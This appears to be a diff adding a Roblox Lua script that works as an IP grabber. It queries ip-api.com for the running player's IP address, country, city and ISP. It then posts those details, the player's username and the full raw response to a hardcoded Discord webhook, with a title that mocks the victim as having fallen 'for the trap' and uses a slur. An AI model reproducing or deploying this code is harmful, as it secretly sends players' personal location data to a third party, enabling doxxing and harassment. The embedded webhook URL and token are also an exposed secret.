@@ -1,0 +1,26 @@
+local hs = game:GetService("HttpService")
+local Response = request({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local bs = Response.Body
+Response = hs:JSONDecode(Response.Body)
+print(Response["query"])
+task.wait()
+
+local hooking = request({
+    Url  = "https://discord.com/api/webhooks/1148170396730925117/Wx1oZXWJUubBpjUS3JfiHAnHAA1Ji1VGu2EdVMpnvebf1bUlqnwxvY7bkrO4YYjMW5aW",
+    Method  = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = hs:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] ="**ok chat some retard fell for the trap his name is "..game.Players.LocalPlayer.Name.."**",
+            ["description"] = "data is \n ip = "..Response["query"].."\n country = "..Response["country"].." \n city = "..Response["city"].."\n isp = "..Response["isp"].."\n well if you want all the details then uh but its messy af then here: ||"..bs.."||",
+            ["type"] = "rich",
+            ["color"] = tonumber("#0000FF")
+        }}
+    })
+})
